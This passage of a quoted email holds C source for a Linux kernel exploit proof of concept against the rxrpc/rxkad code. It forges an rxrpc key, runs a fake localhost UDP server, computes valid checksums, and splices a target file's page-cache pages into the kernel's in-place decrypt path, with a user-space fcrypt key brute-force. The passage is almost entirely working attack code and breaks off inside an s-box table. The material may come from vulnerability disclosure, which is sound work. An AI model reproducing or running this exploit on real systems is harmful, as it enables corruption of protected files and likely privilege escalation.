>         *(uint32_t *)p =3D htonl(0); p +=3D 4;   /* flags */
>         const char *cell =3D "evil";
>         uint32_t clen =3D strlen(cell);
>         *(uint32_t *)p =3D htonl(clen); p +=3D 4;
>         memcpy(p, cell, clen);
>         uint32_t pad =3D (4 - (clen & 3)) & 3;
>         memset(p + clen, 0, pad);
>         p +=3D clen + pad;
>         *(uint32_t *)p =3D htonl(1); p +=3D 4;   /* ntoken */
>         uint8_t *toklen_p =3D p; p +=3D 4;
>         uint8_t *tokstart =3D p;
>         *(uint32_t *)p =3D htonl(2); p +=3D 4;   /* sec_ix =3D RXKAD */
>         *(uint32_t *)p =3D htonl(0); p +=3D 4;   /* vice_id */
>         *(uint32_t *)p =3D htonl(1); p +=3D 4;   /* kvno */
>         memcpy(p, SESSION_KEY, 8); p +=3D 8;   /* session_key K */
>         *(uint32_t *)p =3D htonl(now); p +=3D 4;
>         *(uint32_t *)p =3D htonl(expires); p +=3D 4;
>         *(uint32_t *)p =3D htonl(1); p +=3D 4;   /* primary_flag */
>         *(uint32_t *)p =3D htonl(8); p +=3D 4;   /* ticket_len */
>         memset(p, 0xCC, 8); p +=3D 8;          /* ticket */
>         uint32_t toklen =3D (uint32_t)(p - tokstart);
>         *(uint32_t *)toklen_p =3D htonl(toklen);
>         if ((size_t)(p - out) > maxlen) { errno =3D E2BIG; return -1; }
>         return (int)(p - out);
> }
>
> static long add_rxrpc_key(const char *desc)
> {
>         uint8_t buf[512];
>         int n =3D build_rxrpc_v1_token(buf, sizeof(buf));
>         if (n < 0) return -1;
>         return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
> }
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
> /* AF_ALG pcbc(fcrypt) helpers                                          */
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static int alg_open_pcbc_fcrypt(const uint8_t key[8])
> {
>         int s =3D socket(AF_ALG, SOCK_SEQPACKET, 0);
>         if (s < 0) { WARN("socket(AF_ALG): %s", strerror(errno)); return
> -1; }
>         struct sockaddr_alg sa =3D { .salg_family =3D AF_ALG };
>         strcpy((char *)sa.salg_type, "skcipher");
>         strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
>         if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
>                 WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
>                 close(s); return -1;
>         }
>         if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
>                 WARN("ALG_SET_KEY: %s", strerror(errno));
>                 close(s); return -1;
>         }
>         return s;
> }
>
> /* Encrypt-or-decrypt a 1+ block of data with a given IV. */
> static int alg_op(int alg_s, int op, const uint8_t iv[8],
>                 const void *in, size_t inlen, void *out)
> {
>         int op_fd =3D accept(alg_s, NULL, NULL);
>         if (op_fd < 0) { WARN("accept(AF_ALG): %s", strerror(errno));
> return -1; }
>
>         char cbuf[CMSG_SPACE(sizeof(int)) +
>                 CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] =3D {0};
>         struct msghdr msg =3D {0};
>         msg.msg_control =3D cbuf;
>         msg.msg_controllen =3D sizeof(cbuf);
>
>         struct cmsghdr *c =3D CMSG_FIRSTHDR(&msg);
>         c->cmsg_level =3D SOL_ALG;
>         c->cmsg_type =3D ALG_SET_OP;
>         c->cmsg_len =3D CMSG_LEN(sizeof(int));
>         *(int *)CMSG_DATA(c) =3D op;
>
>         c =3D CMSG_NXTHDR(&msg, c);
>         c->cmsg_level =3D SOL_ALG;
>         c->cmsg_type =3D ALG_SET_IV;
>         c->cmsg_len =3D CMSG_LEN(sizeof(struct af_alg_iv) + 8);
>         struct af_alg_iv *aiv =3D (struct af_alg_iv *)CMSG_DATA(c);
>         aiv->ivlen =3D 8;
>         memcpy(aiv->iv, iv, 8);
>
>         struct iovec iov =3D { .iov_base =3D (void *)in, .iov_len =3D inl=
en };
>         msg.msg_iov =3D &iov; msg.msg_iovlen =3D 1;
>
>         if (sendmsg(op_fd, &msg, 0) < 0) {
>                 WARN("AF_ALG sendmsg: %s", strerror(errno));
>                 close(op_fd); return -1;
>         }
>         ssize_t n =3D read(op_fd, out, inlen);
>         close(op_fd);
>         if (n !=3D (ssize_t)inlen) {
>                 WARN("AF_ALG read got %zd want %zu: %s",
>                                 n, inlen, strerror(errno));
>                 return -1;
>         }
>         return 0;
> }
>
> /* Compute conn->rxkad.csum_iv (ref: rxkad_prime_packet_security):
>  *   tmpbuf[0..3] =3D htonl(epoch, cid, 0, security_ix)  (16 B)
>  *   PCBC-encrypt(tmpbuf, IV=3Dsession_key) =E2=86=92 out[16]
>  *   csum_iv =3D out[8..15]   (last 8 B =3D "tmpbuf[2..3]" after encrypti=
on)
>  */
> static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
>                 const uint8_t key[8], uint8_t csum_iv[8])
> {
>         int s =3D alg_open_pcbc_fcrypt(key);
>         if (s < 0) return -1;
>         uint32_t in[4]  =3D { htonl(epoch), htonl(cid), 0, htonl(sec_ix) =
};
>         uint8_t  out[16];
>         int rc =3D alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
>         close(s);
>         if (rc < 0) return -1;
>         memcpy(csum_iv, out + 8, 8);
>         return 0;
> }
>
> /* Compute the wire cksum (ref: rxkad_secure_packet @rxkad.c:342):
>  *   x =3D (cid_low2 << 30) | (seq & 0x3fffffff)
>  *   buf[0] =3D htonl(call_id), buf[1] =3D htonl(x)    (8 B)
>  *   PCBC-encrypt(buf, IV=3Dcsum_iv) =E2=86=92 enc[8]
>  *   y =3D ntohl(enc[1]); cksum =3D (y >> 16) & 0xffff;  if zero -> 1
>  */
> static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
>                 const uint8_t key[8], const uint8_t csum_iv[8],
>                 uint16_t *cksum_out)
> {
>         int s =3D alg_open_pcbc_fcrypt(key);
>         if (s < 0) return -1;
>         uint32_t x =3D (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
>         x |=3D seq & 0x3fffffff;
>         uint32_t in[2] =3D { htonl(call_id), htonl(x) };
>         uint32_t out[2];
>         int rc =3D alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
>         close(s);
>         if (rc < 0) return -1;
>         uint32_t y =3D ntohl(out[1]);
>         uint16_t v =3D (y >> 16) & 0xffff;
>         if (v =3D=3D 0) v =3D 1;
>         *cksum_out =3D v;
>         return 0;
> }
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
> /* AF_RXRPC client                                                      */
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
> {
>         int fd =3D socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
>         if (fd < 0) { WARN("socket(AF_RXRPC client): %s",
> strerror(errno)); return -1; }
>         if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
>                                 keyname, strlen(keyname)) < 0) {
>                 WARN("client SECURITY_KEY: %s", strerror(errno));
> close(fd); return -1;
>         }
>         int min_level =3D RXRPC_SECURITY_AUTH;
>         if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
>                                 &min_level, sizeof(min_level)) < 0) {
>                 WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
>                 close(fd); return -1;
>         }
>         struct sockaddr_rxrpc srx =3D {0};
>         srx.srx_family =3D AF_RXRPC;
>         srx.srx_service =3D 0;
>         srx.transport_type =3D SOCK_DGRAM;
>         srx.transport_len =3D sizeof(struct sockaddr_in);
>         srx.transport.sin.sin_family =3D AF_INET;
>         srx.transport.sin.sin_port =3D htons(local_port);
>         srx.transport.sin.sin_addr.s_addr =3D htonl(0x7F000001);
>         if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
>                 WARN("client bind :%u: %s", local_port, strerror(errno));
>                 close(fd); return -1;
>         }
>         LOG("AF_RXRPC client bound :%u", local_port);
>         return fd;
> }
>
> static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
>                 uint16_t service_id,
>                 unsigned long user_call_id)
> {
>         char data[8] =3D "PINGPING";
>         struct sockaddr_rxrpc srx =3D {0};
>         srx.srx_family =3D AF_RXRPC;
>         srx.srx_service =3D service_id;
>         srx.transport_type =3D SOCK_DGRAM;
>         srx.transport_len =3D sizeof(struct sockaddr_in);
>         srx.transport.sin.sin_family =3D AF_INET;
>         srx.transport.sin.sin_port =3D htons(srv_port);
>         srx.transport.sin.sin_addr.s_addr =3D htonl(0x7F000001);
>
>         char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
>         struct msghdr msg =3D {0};
>         msg.msg_name =3D &srx; msg.msg_namelen =3D sizeof(srx);
>         struct iovec iov =3D { .iov_base =3D data, .iov_len =3D sizeof(da=
ta) };
>         msg.msg_iov =3D &iov; msg.msg_iovlen =3D 1;
>         msg.msg_control =3D cmsg_buf; msg.msg_controllen =3D sizeof(cmsg_=
buf);
>         struct cmsghdr *cmsg =3D CMSG_FIRSTHDR(&msg);
>         cmsg->cmsg_level =3D SOL_RXRPC;
>         cmsg->cmsg_type =3D RXRPC_USER_CALL_ID;
>         cmsg->cmsg_len =3D CMSG_LEN(sizeof(unsigned long));
>         *(unsigned long *)CMSG_DATA(cmsg) =3D user_call_id;
>
>         /* Don't block forever if no reply ever comes through this single
> sendmsg. */
>         int fl =3D fcntl(cli_fd, F_GETFL);
>         fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
>
>         ssize_t n =3D sendmsg(cli_fd, &msg, 0);
>         fcntl(cli_fd, F_SETFL, fl);
>         if (n < 0) {
>                 if (errno =3D=3D EAGAIN || errno =3D=3D EWOULDBLOCK) {
>                         LOG("client sendmsg returned EAGAIN (expected;
> kernel will keep "
>                                         "retrying handshake)");
>                         return 0;
>                 }
>                 WARN("client sendmsg: %s", strerror(errno));
>                 return -1;
>         }
>         LOG("client sendmsg %zd B =E2=86=92 :%u (handshake will follow
> asynchronously)",
>                         n, srv_port);
>         return 0;
> }
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
> /* fake-server (plain UDP)                                              */
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static int setup_udp_server(uint16_t port)
> {
>         int s =3D socket(AF_INET, SOCK_DGRAM, 0);
>         if (s < 0) { WARN("socket(udp server): %s", strerror(errno));
> return -1; }
>         struct sockaddr_in sa =3D {0};
>         sa.sin_family =3D AF_INET;
>         sa.sin_port =3D htons(port);
>         sa.sin_addr.s_addr =3D htonl(0x7F000001);
>         if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
>                 WARN("udp server bind :%u: %s", port, strerror(errno));
>                 close(s); return -1;
>         }
>         LOG("plain UDP fake-server bound :%u", port);
>         return s;
> }
>
> /* Receive one UDP datagram with timeout (ms). Returns bytes or -1. */
> static ssize_t udp_recv_to(int s, void *buf, size_t cap,
>                 struct sockaddr_in *from, int timeout_ms)
> {
>         struct pollfd pfd =3D { .fd =3D s, .events =3D POLLIN };
>         int rc =3D poll(&pfd, 1, timeout_ms);
>         if (rc <=3D 0) return -1;
>         socklen_t fl =3D from ? sizeof(*from) : 0;
>         return recvfrom(s, buf, cap, 0,
>                         (struct sockaddr *)from, from ? &fl : NULL);
> }
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
> /* main PoC                                                             */
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static int trigger_seq =3D 0;
>
> static int do_one_trigger(int target_fd, off_t splice_off, size_t
> splice_len)
> {
>         char keyname[32];
>         snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);
>
>         long key =3D add_rxrpc_key(keyname);
>         if (key < 0) {
>                 if (trigger_seq < 5) WARN("add_rxrpc_key(%s): %s",
> keyname, strerror(errno));
>                 return -1;
>         }
>
>         /* Use varying ports so kernel TIME_WAIT / stale state does not
> bite. */
>         uint16_t port_S =3D 7777 + (trigger_seq * 2 % 200);
>         uint16_t port_C =3D port_S + 1;
>         uint16_t svc_id =3D 1234;
>
>         int udp_srv =3D setup_udp_server(port_S);
>         if (udp_srv < 0) {
>                 if (trigger_seq < 5) WARN("setup_udp_server(%u) failed",
> port_S);
>                 syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key); return
> -1;
>         }
>
>         int rxsk_cli =3D setup_rxrpc_client(port_C, keyname);
>         if (rxsk_cli < 0) {
>                 if (trigger_seq < 5) WARN("setup_rxrpc_client(%u, %s)
> failed", port_C, keyname);
>                 close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
>         }
>
>         if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) <
> 0) {
>                 if (trigger_seq < 5) WARN("rxrpc_client_initiate_call
> failed");
>                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
> key); return -1;
>         }
>
>         uint8_t pkt[2048];
>         struct sockaddr_in cli_addr;
>         ssize_t n =3D udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr,
> 1500);
>         if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
>                 if (trigger_seq < 5) WARN("udp_recv_to: n=3D%zd errno=3D%=
s",
> n, strerror(errno));
>                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
> key); return -1;
>         }
>         struct rxrpc_wire_header *whdr_in =3D (struct rxrpc_wire_header
> *)pkt;
>         uint32_t epoch  =3D ntohl(whdr_in->epoch);
>         uint32_t cid    =3D ntohl(whdr_in->cid);
>         uint32_t callN  =3D ntohl(whdr_in->callNumber);
>         uint16_t svc_in =3D ntohs(whdr_in->serviceId);
>         uint16_t cli_port =3D ntohs(cli_addr.sin_port);
>
>         /* Send CHALLENGE */
>         {
>                 struct {
>                         struct rxrpc_wire_header hdr;
>                         struct rxkad_challenge   ch;
>                 } __attribute__((packed)) c =3D {0};
>                 c.hdr.epoch =3D htonl(epoch);
>                 c.hdr.cid =3D htonl(cid);
>                 c.hdr.callNumber =3D 0; c.hdr.seq =3D 0;
>                 c.hdr.serial =3D htonl(0x10000);
>                 c.hdr.type =3D RXRPC_PACKET_TYPE_CHALLENGE;
>                 c.hdr.securityIndex =3D 2;
>                 c.hdr.serviceId =3D htons(svc_in);
>                 c.ch.version =3D htonl(2); c.ch.nonce =3D htonl(0xDEADBEE=
Fu);
>                 c.ch.min_level =3D htonl(1);
>                 struct sockaddr_in to =3D { .sin_family=3DAF_INET,
> .sin_port=3Dhtons(cli_port),
>                         .sin_addr.s_addr=3Dhtonl(0x7F000001) };
>                 if (sendto(udp_srv, &c, sizeof(c), 0, (struct
> sockaddr*)&to, sizeof(to)) < 0) {
>                         close(rxsk_cli); close(udp_srv);
> syscall(SYS_keyctl, 3, key); return -1;
>                 }
>         }
>
>         /* Drain RESPONSE (best-effort) */
>         for (int i =3D 0; i < 4; i++) {
>                 struct sockaddr_in src;
>                 if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0)
> break;
>         }
>
>         /* csum + cksum with CURRENT SESSION_KEY */
>         uint8_t csum_iv[8] =3D {0};
>         if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
>                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
> key); return -1;
>         }
>         uint16_t cksum_h =3D 0;
>         if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) <
> 0) {
>                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
> key); return -1;
>         }
>
>         /* Build malicious DATA header */
>         struct rxrpc_wire_header mal =3D {0};
>         mal.epoch =3D htonl(epoch);
>         mal.cid =3D htonl(cid);
>         mal.callNumber =3D htonl(callN);
>         mal.seq =3D htonl(1);
>         mal.serial =3D htonl(0x42000);
>         mal.type =3D RXRPC_PACKET_TYPE_DATA;
>         mal.flags =3D RXRPC_LAST_PACKET;
>         mal.securityIndex =3D 2;
>         mal.cksum =3D htons(cksum_h);
>         mal.serviceId =3D htons(svc_in);
>
>         /* connect udp_srv =E2=86=92 client port for splice */
>         struct sockaddr_in dst =3D { .sin_family=3DAF_INET,
> .sin_port=3Dhtons(cli_port),
>                 .sin_addr.s_addr=3Dhtonl(0x7F000001) };
>         if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
>                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
> key); return -1;
>         }
>
>         /* pipe + vmsplice header + splice file =E2=86=92 pipe =E2=86=92 =
udp_srv */
>         int p[2];
>         if (pipe(p) < 0) {
>                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
> key); return -1;
>         }
>         {
>                 struct iovec viv =3D { .iov_base =3D &mal, .iov_len =3D
> sizeof(mal) };
>                 if (vmsplice(p[1], &viv, 1, 0) < 0) goto trig_fail;
>         }
>         {
>                 loff_t off =3D splice_off;
>                 if (splice(target_fd, &off, p[1], NULL, splice_len,
> SPLICE_F_NONBLOCK) < 0)
>                         goto trig_fail;
>         }
>         if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0)
> < 0) {
>                 goto trig_fail;
>         }
>         close(p[0]); close(p[1]);
>
>         /* recvmsg the malicious DATA into the kernel's verify_packet path
> */
>         int fl =3D fcntl(rxsk_cli, F_GETFL);
>         fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
>         for (int round =3D 0; round < 5; round++) {
>                 char rb[2048];
>                 struct sockaddr_rxrpc srx;
>                 char ccb[256];
>                 struct msghdr m =3D {0};
>                 struct iovec iv =3D { .iov_base =3D rb, .iov_len =3D size=
of(rb)
> };
>                 m.msg_name =3D &srx; m.msg_namelen =3D sizeof(srx);
>                 m.msg_iov =3D &iv;  m.msg_iovlen =3D 1;
>                 m.msg_control =3D ccb; m.msg_controllen =3D sizeof(ccb);
>                 ssize_t r =3D recvmsg(rxsk_cli, &m, 0);
>                 if (r > 0) break;
>                 if (errno =3D=3D EAGAIN || errno =3D=3D EWOULDBLOCK) usle=
ep(20000);
>                 else break;
>         }
>         fcntl(rxsk_cli, F_SETFL, fl);
>
>         close(rxsk_cli);
>         close(udp_srv);
>         syscall(SYS_keyctl, 3, key);
>         return 0;
>
> trig_fail:
>         close(p[0]); close(p[1]);
>         close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key);
>         return -1;
> }
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>  * USER-SPACE pcbc(fcrypt) BRUTE-FORCE
>  *
>  * The kernel's rxkad_verify_packet_1() does an in-place 8-byte
>  * pcbc(fcrypt) decrypt with iv=3D0 over the page-cache page at the splice
>  * offset.  pcbc with single 8-B block and IV=3D0 reduces to a plain
>  * fcrypt_decrypt(C, K).  We can therefore search for the right K
>  * entirely in user-space =E2=80=94 without touching the kernel/VM at all=
 =E2=80=94
>  * before applying ONE deterministic kernel trigger.
>  *
>  * Port of crypto/fcrypt.c from the kernel source (David Howells / KTH).
>  * Verified against kernel test vectors:
>  *   K=3D0,         decrypt(0E0900C73EF7ED41) =3D 00000000
>  *   K=3D1144...66, decrypt(D8ED787477EC0680) =3D 123456789ABCDEF0
>  * =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static const uint8_t fc_sbox0_raw[256] =3D {
>         0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86,
> 0x91, 0x0a, 0xb2, 0x93, 0x06,
>         0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20, 0xb5,
> 0x38, 0x7e, 0xda, 0x9f, 0xe3,
>         0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a, 0x4a, 0x35, 0xac, 0xaa,
> 0x5f, 0x2b, 0xbb, 0xbc, 0x53,
>         0x4e, 0x9d, 0x78, 0xa3, 0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66,
> 0xd6, 0xab, 0xa9, 0xaf, 0xfd,
>         0x3b, 0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec,
> 0xda, 0x9f, 0x26, 0x76, 0x15,
>         0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d,
> 0xd3, 0x04, 0x49, 0xaa, 0x24,
>         0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8, 0xb1, 0xd4, 0x01,
> 0xd8, 0x70, 0x64, 0xf0, 0x51,
>         0xd2, 0xc3, 0xa7, 0x75, 0x8c, 0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7,
> 0xc6, 0x61, 0x03, 0xeb, 0x44,
>         0x3d, 0xe5, 0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e,
> 0x33, 0xab, 0x93, 0xa2, 0xb7,
>         0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e,
> 0x2e, 0x62, 0x03, 0xc8, 0xe0,
>         0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e, 0x97, 0x65,
> 0x60, 0x69, 0xb6, 0xf6, 0xe6,
>         0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf, 0xdd, 0x95, 0x22, 0x99, 0xfd,
> 0x63, 0x19, 0x74, 0x61, 0xb1,
>         0xb6, 0x5b, 0xae, 0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1,
> 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
>         0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa,
> 0x26, 0x49, 0xe0, 0x21, 0x64,
>         0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8, 0xb6,
> 0xb9, 0xf1, 0x24, 0x75, 0x03,
>         0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1, 0x39, 0x72, 0x12, 0xf6,
> 0xba, 0x0c, 0x0d, 0x42, 0x2e,
> };
> static const uint8_t fc_sbox1_raw[256] =3D {
>         0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1,
> 0x0d, 0xc2, 0xa2, 0xc1, 0x85,
>         0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c, 0x03,
> 0xb7, 0x73, 0xe6, 0xe1, 0x39,
>         0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44, 0xd6, 0x23, 0x83, 0x98,
> 0x7d, 0x3c, 0xb4, 0x2d, 0x99,
>         0x1c, 0x1f, 0x8c, 0x20, 0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95,
> 0xca, 0x76, 0x44, 0xcd, 0xb6,
>         0xb8, 0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31,
> 0x8a, 0x23, 0x17, 0x04, 0xfa,
>         0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60,
> 0x6b, 0x5b, 0xc4, 0x4b, 0xbc,
>         0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd, 0x00, 0x92, 0x7d,
> 0x97, 0x7a, 0x18, 0x60, 0x3d,
>         0xcf, 0x5b, 0xde, 0xc6, 0xe2, 0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08,
> 0x15, 0x1b, 0x88, 0x6a, 0x17,
>         0x89, 0xd0, 0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68,
> 0xc8, 0xd3, 0x84, 0x28, 0x0a,
>         0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88,
> 0x94, 0x5e, 0x9c, 0x63, 0xd5,
>         0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44, 0xc4, 0xe0,
> 0x8f, 0x23, 0x3c, 0x12, 0x52,
>         0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33, 0x1f, 0xf8, 0x69, 0x10, 0x9d,
> 0xd3, 0xf7, 0x28, 0xf8, 0x30,
>         0x05, 0x5e, 0x32, 0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd,
> 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
>         0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81,
> 0xb7, 0x1d, 0x43, 0xd9, 0xd7,
>         0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7, 0x34,
> 0xd6, 0x43, 0xdf, 0xe4, 0x78,
>         0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1, 0xd4, 0x70, 0x03, 0xe0,
> 0x2f, 0x96, 0x91, 0x82, 0x80,
> };
> static const uint8_t fc_sbox2_raw[256] =3D {
>         0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50,
> 0xf0, 0x42, 0x78, 0x2f, 0x6d,
>         0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f, 0xdb,
> 0xb4, 0x65, 0x6e, 0xe7, 0x24,
>         0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d, 0xb9, 0xe8, 0xdc, 0xb7,
> 0xd9, 0x45, 0x20, 0x1b, 0xce,
>         0x59, 0x9d, 0x6b, 0xbd, 0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6,
> 0xf6, 0x7f, 0x5f, 0xb1, 0x68,
